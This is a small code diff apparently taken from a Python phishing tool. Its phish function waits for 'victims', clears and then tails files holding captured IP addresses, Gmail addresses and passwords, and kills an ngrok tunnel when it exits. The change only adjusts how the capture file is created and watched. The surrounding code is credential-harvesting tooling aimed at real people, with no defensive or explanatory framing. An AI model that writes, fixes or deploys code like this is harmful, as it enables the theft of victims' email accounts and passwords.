@@ -261,9 +261,9 @@ def phish(template):
 	print()
 	print(f"{B}[{G}>{B}]{W} Wating for victims ...[ {G} Press Ctrl + C to exit {W} ]")
 	def check_ok():
-		os.system('rm ip.txt gmail.txt pass.txt > /dev/null 2&>1')
+		os.system('rm ip.txt gmail.txt pass.txt > /dev/null 2&>1 ')
 		try:
-			os.system("tail -f ip.txt	")
+			os.system(" touch ip.txt && tail -f ip.txt	")
 		except KeyboardInterrupt:
 			print(f"\n\n{Y} Exiting ")
 			os.system('pkill ngrok ')
